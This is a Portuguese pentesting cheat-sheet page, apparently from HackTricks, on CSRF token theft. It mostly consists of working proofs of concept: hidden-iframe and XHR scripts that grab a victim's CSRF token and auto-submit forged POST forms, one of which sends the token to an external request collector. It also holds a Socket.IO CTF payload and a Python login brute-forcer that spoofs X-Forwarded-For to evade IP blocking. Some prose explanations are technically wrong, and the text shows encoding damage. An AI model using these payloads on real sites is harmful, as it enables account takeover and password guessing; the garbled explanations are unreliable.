Uma t√©cnica comum de ataque CSRF (Cross-Site Request Forgery) envolve roubar o token CSRF de um usu√°rio e us√°-lo para enviar uma solicita√ß√£o POST maliciosa em seu nome. Isso pode ser feito usando um iframe, um formul√°rio ou Ajax.

#### Usando um iframe:

1. O atacante cria um site malicioso que cont√©m um iframe apontando para o alvo leg√≠timo.
2. O iframe √© carregado no navegador do usu√°rio alvo, fazendo com que o token CSRF seja enviado automaticamente para o site malicioso.
3. O atacante extrai o token CSRF do iframe usando JavaScript.
4. O atacante usa o token CSRF roubado para enviar uma solicita√ß√£o POST maliciosa para o alvo leg√≠timo, executando a a√ß√£o desejada.

#### Usando um formul√°rio:

1. O atacante cria um formul√°rio malicioso em seu site.
2. O formul√°rio √© preenchido com os dados necess√°rios para a solicita√ß√£o POST maliciosa, incluindo o token CSRF roubado.
3. O atacante usa JavaScript para enviar automaticamente o formul√°rio para o alvo leg√≠timo, executando a a√ß√£o desejada.

#### Usando Ajax:

1. O atacante cria uma solicita√ß√£o Ajax maliciosa em seu site.
2. A solicita√ß√£o Ajax √© configurada com os dados necess√°rios para a solicita√ß√£o POST maliciosa, incluindo o token CSRF roubado.
3. O atacante usa JavaScript para enviar a solicita√ß√£o Ajax para o alvo leg√≠timo, executando a a√ß√£o desejada.

Essas t√©cnicas permitem que um atacante explore a confian√ßa entre o usu√°rio e o site leg√≠timo, enganando o navegador do usu√°rio para que execute a√ß√µes indesejadas em seu nome. Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como o uso de tokens CSRF exclusivos e a valida√ß√£o adequada das solicita√ß√µes.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o POST usando um iframe e um formul√°rio**

Uma t√©cnica comum de ataque CSRF (Cross-Site Request Forgery) envolve roubar o token CSRF de um usu√°rio e us√°-lo para enviar uma solicita√ß√£o POST maliciosa. Isso pode ser feito usando um iframe e um formul√°rio.

1. Primeiro, o atacante cria um site malicioso que cont√©m um iframe invis√≠vel. O atributo `src` do iframe √© definido como o URL do site alvo que cont√©m a funcionalidade vulner√°vel.

```html
<iframe style="display:none" src="https://www.sitetalvo.com/"></iframe>
```

2. Em seguida, o atacante cria um formul√°rio no site malicioso. O formul√°rio √© configurado para enviar uma solicita√ß√£o POST para o URL vulner√°vel do site alvo. O token CSRF √© inclu√≠do como um campo oculto no formul√°rio.

```html
<form action="https://www.sitetalvo.com/vulnerabilidade" method="POST">
  <input type="hidden" name="csrf_token" value="TOKEN_CSRF_AQUI">
  <!-- Outros campos do formul√°rio -->
  <input type="submit" value="Enviar">
</form>
```

3. Quando um usu√°rio visita o site malicioso, o iframe invis√≠vel √© carregado em segundo plano. Isso faz com que o navegador do usu√°rio fa√ßa uma solicita√ß√£o GET para o site alvo, o que resulta na obten√ß√£o do token CSRF v√°lido.

4. Em seguida, o formul√°rio malicioso √© enviado automaticamente usando JavaScript. Isso faz com que o navegador do usu√°rio envie uma solicita√ß√£o POST para o URL vulner√°vel do site alvo, incluindo o token CSRF roubado.

```html
<script>
  document.forms[0].submit();
</script>
```

5. O servidor do site alvo recebe a solicita√ß√£o POST e, como o token CSRF √© v√°lido, processa a solicita√ß√£o como se fosse leg√≠tima. Isso pode levar a a√ß√µes indesejadas, como alterar informa√ß√µes do usu√°rio, fazer compras n√£o autorizadas ou executar outras a√ß√µes maliciosas.

Para se proteger contra esse tipo de ataque, os desenvolvedores devem implementar medidas de seguran√ßa, como a inclus√£o de tokens CSRF exclusivos em todas as solicita√ß√µes POST e a valida√ß√£o desses tokens no servidor. Os usu√°rios tamb√©m devem estar cientes dos riscos de visitar sites n√£o confi√°veis e manter seus sistemas atualizados com as √∫ltimas corre√ß√µes de seguran√ßa.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Roubar token e envi√°-lo usando 2 iframes**

Um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) √© um tipo de ataque em que um invasor engana um usu√°rio autenticado para executar a√ß√µes indesejadas em um aplicativo da web no qual o usu√°rio est√° autenticado. Um m√©todo comum para realizar um ataque CSRF √© roubar o token de autentica√ß√£o de um usu√°rio e envi√°-lo para um servidor controlado pelo invasor.

Neste exemplo, vamos explorar uma t√©cnica em que o invasor usa dois iframes para roubar o token de autentica√ß√£o de um usu√°rio e envi√°-lo para seu pr√≥prio servidor.

1. O invasor cria uma p√°gina maliciosa que cont√©m dois iframes invis√≠veis.
2. O primeiro iframe √© carregado com a p√°gina alvo que cont√©m a a√ß√£o que o invasor deseja executar.
3. O segundo iframe √© carregado com uma p√°gina controlada pelo invasor que cont√©m um script para roubar o token de autentica√ß√£o.
4. O script no segundo iframe acessa o documento do primeiro iframe e extrai o token de autentica√ß√£o.
5. O token de autentica√ß√£o √© enviado para o servidor controlado pelo invasor usando uma solicita√ß√£o AJAX ou outra t√©cnica de envio de dados.

Ao usar essa t√©cnica, o invasor pode roubar o token de autentica√ß√£o de um usu√°rio autenticado e us√°-lo para executar a√ß√µes indesejadas em nome do usu√°rio, como fazer altera√ß√µes em suas configura√ß√µes, enviar mensagens em seu nome ou realizar transa√ß√µes financeiras.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como o uso de tokens de autentica√ß√£o exclusivos para cada solicita√ß√£o e a valida√ß√£o desses tokens antes de executar a√ß√µes sens√≠veis. Os usu√°rios tamb√©m devem estar cientes dos riscos de clicar em links ou abrir p√°ginas suspeitas, especialmente quando j√° est√£o autenticados em um aplicativo da web.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRoubar token CSRF com Ajax e enviar um post com um formul√°rio**

Uma t√©cnica comum para explorar vulnerabilidades de Cross-Site Request Forgery (CSRF) √© roubar o token CSRF de um usu√°rio autenticado e us√°-lo para enviar uma solicita√ß√£o POST maliciosa. Isso pode ser feito usando Ajax para obter o token CSRF e, em seguida, envi√°-lo junto com os dados do formul√°rio em uma solicita√ß√£o POST.

Aqui est√° um exemplo de como essa t√©cnica pode ser implementada:

```javascript
// Obter o token CSRF usando Ajax
var xhr = new XMLHttpRequest();
xhr.open('GET', '/get-csrf-token', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var csrfToken = xhr.responseText;

    // Enviar uma solicita√ß√£o POST com o token CSRF e os dados do formul√°rio
    var formData = new FormData();
    formData.append('csrf_token', csrfToken);
    formData.append('data', 'dados maliciosos');

    var xhr2 = new XMLHttpRequest();
    xhr2.open('POST', '/submit-form', true);
    xhr2.onreadystatechange = function() {
      if (xhr2.readyState === 4 && xhr2.status === 200) {
        console.log('Formul√°rio enviado com sucesso!');
      }
    };
    xhr2.send(formData);
  }
};
xhr.send();
```

Neste exemplo, o c√≥digo JavaScript faz uma solicita√ß√£o GET para obter o token CSRF do servidor. Em seguida, ele cria um objeto FormData e anexa o token CSRF e os dados maliciosos ao formul√°rio. Por fim, uma solicita√ß√£o POST √© enviada para o servidor com o token CSRF e os dados do formul√°rio.

√â importante ressaltar que essa t√©cnica s√≥ funcionar√° se o token CSRF estiver acess√≠vel por meio de uma solicita√ß√£o Ajax. Al√©m disso, o servidor deve aceitar solicita√ß√µes POST com o token CSRF fornecido dessa maneira.

Os desenvolvedores devem implementar medidas de prote√ß√£o adequadas, como a verifica√ß√£o do referenciador (Referer header) e a inclus√£o de tokens CSRF em formul√°rios, para mitigar ataques de CSRF.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF com Socket.IO

O Cross-Site Request Forgery (CSRF) √© uma vulnerabilidade que permite que um atacante execute a√ß√µes n√£o autorizadas em nome de um usu√°rio autenticado em um aplicativo da web. O Socket.IO √© uma biblioteca JavaScript que permite a comunica√ß√£o em tempo real entre o cliente e o servidor. Neste cap√≠tulo, discutiremos como o CSRF pode ser explorado em aplicativos que utilizam o Socket.IO.

#### Como o CSRF funciona com o Socket.IO?

O Socket.IO utiliza uma conex√£o persistente entre o cliente e o servidor para enviar e receber dados em tempo real. No entanto, essa conex√£o persistente tamb√©m pode ser explorada por um atacante para realizar ataques CSRF.

O ataque CSRF com o Socket.IO ocorre quando um atacante engana um usu√°rio autenticado a visitar um site malicioso que cont√©m c√≥digo JavaScript malicioso. Esse c√≥digo JavaScript malicioso pode se conectar ao servidor Socket.IO leg√≠timo e enviar comandos para executar a√ß√µes indesejadas em nome do usu√°rio autenticado.

#### Preven√ß√£o de CSRF com Socket.IO

Existem v√°rias medidas que podem ser tomadas para mitigar o risco de CSRF em aplicativos que utilizam o Socket.IO:

1. **Verifica√ß√£o de origem**: O servidor Socket.IO pode verificar a origem das solicita√ß√µes recebidas para garantir que elas provenham de um dom√≠nio confi√°vel. Isso pode ser feito comparando o cabe√ßalho "Origin" da solicita√ß√£o com uma lista de dom√≠nios confi√°veis.

2. **Token CSRF**: Um token CSRF pode ser gerado pelo servidor e inclu√≠do em todas as solicita√ß√µes enviadas pelo cliente. Esse token √© ent√£o verificado pelo servidor para garantir que a solicita√ß√£o seja leg√≠tima e n√£o provenha de um ataque CSRF.

3. **Cookies seguros**: O uso de cookies seguros pode ajudar a mitigar o risco de CSRF. Os cookies seguros s√£o enviados apenas por meio de conex√µes criptografadas (HTTPS), o que dificulta a intercepta√ß√£o por parte de um atacante.

4. **Pol√≠tica de mesma origem**: A pol√≠tica de mesma origem (Same Origin Policy) pode ser implementada para restringir o acesso a recursos do Socket.IO apenas a partir do mesmo dom√≠nio de origem. Isso impede que um site malicioso acesse a conex√£o Socket.IO de um usu√°rio autenticado.

#### Conclus√£o

O CSRF com o Socket.IO √© uma amea√ßa real em aplicativos da web que utilizam essa biblioteca para comunica√ß√£o em tempo real. √â importante implementar medidas de seguran√ßa adequadas, como verifica√ß√£o de origem, tokens CSRF, cookies seguros e pol√≠tica de mesma origem, para mitigar o risco de ataques CSRF bem-sucedidos.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

O c√≥digo pode ser usado para realizar um ataque de for√ßa bruta em um formul√°rio de login usando um token CSRF (Tamb√©m est√° utilizando o cabe√ßalho X-Forwarded-For para tentar contornar um poss√≠vel bloqueio de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Ferramentas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Refer√™ncias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
